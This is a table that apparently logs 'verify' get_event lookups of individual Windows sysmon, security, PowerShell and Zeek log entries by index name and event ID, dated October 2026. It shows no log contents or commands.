| q-d75219b9f4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-c1df6cf7c6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-95a012425c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsS38Vi"} | None |  |
| q-4a521d3702 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsS38Vi"} | None |  |
| q-526d818130 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-5fb311d43e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcw"} | None |  |
| q-869b1051ee | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-a7d3849888 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsO1YsM"} | None |  |
| q-edeecb1e23 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsO1YsM"} | None |  |
| q-1f7f198ba7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAt"} | None |  |
| q-3d099222ad | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAu"} | None |  |
| q-75e28f34ab | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-c7b79d1f19 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-d1260debb6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-e56d4f644a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkCwA"} | None |  |
| q-d632c4f44a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk0gjm"} | None |  |
| q-4c347262ef | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpIWWNw"} | None |  |
| q-ee6eb126ef | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpIWWNw"} | None |  |
| q-cc4f9538e0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpizV0l"} | None |  |
| q-92ef972c66 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpESdr2"} | None |  |
| q-99e8cc763b | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWW2"} | None |  |
| q-6766d5efdc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpEStoK"} | None |  |
| q-f4932fd49f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpEStoK"} | None |  |
| q-f54b6056a9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItn-BEDj"} | None |  |
| q-3df96da806 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItj59cFt"} | None |  |
| q-ee84289765 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkHK8X3"} | None |  |
| q-a406de40d9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItj59cEe"} | None |  |
| q-35378a8df7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-25472f959e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-74e44a3318 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAt"} | None |  |
| q-e95bac452f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkady05"} | None |  |
| q-894d05d28e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopf"} | None |  |
| q-18a085a6ef | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-be8305cb14 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-452c709a1c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkKNZkz"} | None |  |
| q-cf9f4da749 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkKNpkH"} | None |  |
| q-7321cbde25 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxXBOw"} | None |  |
| q-a29db2abf6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkx5Y1-"} | None |  |
| q-4926f343d5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr1M"} | None |  |
| q-b2d6a21a41 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-d09c5c779e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-3f956ad23d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-176c3ca2d6 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSxb"} | None |  |
| q-665e9af8c3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-8b67f3647c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-899009270c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-5beceb2179 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-4d9e460d84 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkx5Y3M"} | None |  |
| q-9c731f9f51 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtdLv"} | None |  |
| q-f79895c9cb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-5a25e3c084 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-e3f6a16686 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYmUF"} | None |  |
| q-44b78c0c11 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-9a0db36539 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-b02357a3ab | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpHV4S3"} | None |  |
| q-f663bb6d3d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSwG"} | None |  |
| q-1a43c2f18a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkHK8V2"} | None |  |
| q-35f6bce3bc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-e842d5f17e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-72c8efce49 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-db7709f006 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-736c8e243c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-2a9f233449 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-10f757ac8e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-5394d10f88 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz-ho2U"} | None |  |
| q-2c3c8c4fb0 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYpu"} | None |  |
| q-61739e37ab | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-f92dde8ef0 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYmUF"} | None |  |
| q-dcace7cd65 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWX1"} | None |  |
| q-688f440463 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-ee066ddd59 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-c7d0da6f75 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-2253a33063 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-fb8880fd19 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-6e5a4905da | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAx"} | None |  |
| q-807e56df80 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSxb"} | None |  |
| q-7a45a5b2d7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-ad05033ea2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-a142f51139 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw468x"} | None |  |
| q-720d6aa4e1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAz"} | None |  |
| q-624d7cc5ca | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JBe"} | None |  |
| q-b5061c5b18 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAz"} | None |  |
| q-07a5e536ef | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwDl0_c"} | None |  |
| q-2b3ce70cbf | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-0f033adcab | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWV3"} | None |  |
| q-51e958147d | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWXW"} | None |  |
| q-6c57de41a5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAs"} | None |  |
| q-8aae9d4e11 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwIqjKK"} | None |  |
| q-f8f8362417 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None |  |
| q-231059c5f4 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWV3"} | None |  |
| q-e52533a7b7 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylr4ud"} | None |  |
| q-3aa7d69eff | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovU"} | None |  |
| q-867188ee94 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrouG"} | None |  |
| q-e433f97c8a | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqO44j"} | None |  |
| q-2e664e9250 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovu"} | None |  |
| q-e1f75221ce | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrot8"} | None |  |
| q-2e8d410cfc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpfwJ9Y"} | None |  |
| q-c71ce132ba | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkYcTxy"} | None |  |
| q-97380c7629 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpp7sSn"} | None |  |
| q-375e831026 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotQ"} | None |  |
| q-13769015a3 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotP"} | None |  |
| q-1bf1d4b2e3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkady05"} | None |  |
| q-234a7387d2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAu"} | None |  |
| q-20292c8b73 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM6"} | None |  |
| q-744c98f292 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovz"} | None |  |
| q-e01b1576ae | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAt"} | None |  |
| q-62112e2c2e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxXRNx"} | None |  |
| q-d27c2675e2 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovy"} | None |  |
| q-80798a5951 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz8vIp5"} | None |  |
| q-176566dea2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkbfEQ2"} | None |  |
| q-fbde906bdd | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrov7"} | None |  |
| q-fdf444f68c | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotT"} | None |  |
| q-da158104bc | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotQ"} | None |  |
| q-e4f9a2cd22 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz8vIp3"} | None |  |
| q-76337d710f | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz8vIp4"} | None |  |
| q-3ac2de3a21 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-41eace6b68 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwHqJZm"} | None |  |
| q-b39fe76483 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-6c3832924a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-cb2431c6ee | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopf"} | None |  |
| q-1a6194f6b6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-cb1d2fc293 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw468x"} | None |  |
| q-d212634a46 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-ecdbe6aa1a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwDlSQT"} | None |  |
| q-6ffb6b3881 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCk1OJ"} | None |  |
| q-e2c55c74d0 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-002e69edb9 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-358aabf3be | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLbBWk"} | None |  |
| q-a81d0f1c21 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLbBWk"} | None |  |
| q-b892b6e524 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpFTsz_"} | None |  |
| q-a9cf1c7b3a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk1QgV"} | None |  |
| q-1d4e736c12 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk1QgV"} | None |  |
| q-6dae2add48 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-ab7b2adbbe | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-fe58ca00b5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None |  |
| q-dd159a4064 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None |  |
| q-4b5b6b1b72 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpHV4S3"} | None |  |
| q-77fbc4dced | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcw"} | None |  |
| q-dc4858e220 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsc9wOe"} | None |  |
| q-f359e97db2 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsQ2v-T"} | None |  |
| q-d9f12072e8 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None |  |
| q-0dbc12f708 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None |  |
| q-dda727a492 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None |  |
| q-4bf4d12e85 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5W"} | None |  |
| q-e75b2e934f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-2aa7213ae8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-0e7a74a6a8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQb3a"} | None |  |
| q-7254cfecdc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-c5c7268013 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None |  |
| q-ac8d4025b6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None |  |
| q-17e13af9fd | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None |  |
| q-1297f00f7d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtAyJ"} | None |  |
| q-6d65e3f259 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM45"} | None |  |
| q-d40712f1ad | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcb"} | None |  |
| q-72956da79c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcb"} | None |  |
| q-bf02cce332 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItse-35u"} | None |  |
| q-b8d61f2b48 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItse-35u"} | None |  |
| q-c96175ae20 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpfwJ_Y"} | None |  |
| q-d9f69f67f5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpfwJ-Y"} | None |  |
| q-23d0fb4912 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-f8ee7f0ef3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-196d689a8c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-4db66473cf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-5096941b4e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-71e70c5803 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-cd652ce205 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-6b1f7972c5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-f6c9eb6874 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-e60682eecb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-a133be7fdf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpjzkPd"} | None |  |
| q-774d494855 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkx5Y3M"} | None |  |
| q-0244e7c261 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-09f5b52702 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtdLv"} | None |  |
| q-d50d16e476 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtdI9"} | None |  |
| q-aa3feff008 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtAyz"} | None |  |
| q-bcd2f2ae9f | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-1552e0c541 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-e5c440d65e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpVlTKv"} | None |  |
| q-0aa81685a8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2o"} | None |  |
| q-0e8a094fda | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpHV4S3"} | None |  |
| q-01aa9e838f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-b3526bdf73 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-2808ba7202 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkjomHY"} | None |  |
| q-62653a2aa6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-c20529a85b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-a35489197d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-706f6d9f2b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkILJ_D"} | None |  |
| q-26f7c14956 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItn-AkDI"} | None |  |
| q-ce51ba6edb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItn-AkDI"} | None |  |
| q-2a39d09608 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItn-AkDI"} | None |  |
| q-f1f021d148 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk1QgV"} | None |  |
